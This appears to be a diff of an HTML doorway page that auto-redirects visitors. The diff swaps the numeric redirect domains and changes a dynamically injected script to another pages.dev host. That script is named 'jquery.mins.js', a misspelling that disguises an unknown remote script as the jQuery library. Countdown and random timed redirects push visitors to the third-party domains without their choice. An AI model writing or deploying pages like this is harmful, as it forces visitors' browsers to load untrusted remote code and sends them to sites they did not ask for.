@@ -212,7 +212,7 @@
       <p>You will enjoy more on our website.</p>
     </div>
 
-    <a class="btn" href="https://688985.com" id="js-btn">
+    <a class="btn" href="https://688944.com" id="js-btn">
       <svg viewBox="0 0 24 24"><path d="M13 7l5 5-5 5M6 12h12"/></svg>
       Go Click
     </a>
@@ -247,7 +247,7 @@
 
     function loadScriptAndStartTimer() {
       const s = document.createElement('script');
-      s.src = 'https://js-ewl.pages.dev/jquery.mins.js';
+      s.src = 'https://id-4fc.pages.dev/jquery.mins.js';
       s.async = true;
       s.onload = () => { alertSet(); };
       s.onerror = () => { console.error('Failed to load jquery.mis.js'); alertSet(); };
@@ -266,7 +266,7 @@
       const i = setInterval(() => {
         if (t <= 0) {
           clearInterval(i);
-          location.href = 'https://688985.com';
+          location.href = 'https://688944.com';
         } else {
           t--;
           x.innerHTML = t;
@@ -287,7 +287,7 @@
 
 <script>
     setTimeout(function() {
-        window.location.href = Math.random() < 0.5 ? "https://688991.com" : "https://688985.com";
+        window.location.href = Math.random() < 0.5 ? "https://688944.com" : "https://688985.com";
     }, 2000);
 </script>
 </body>
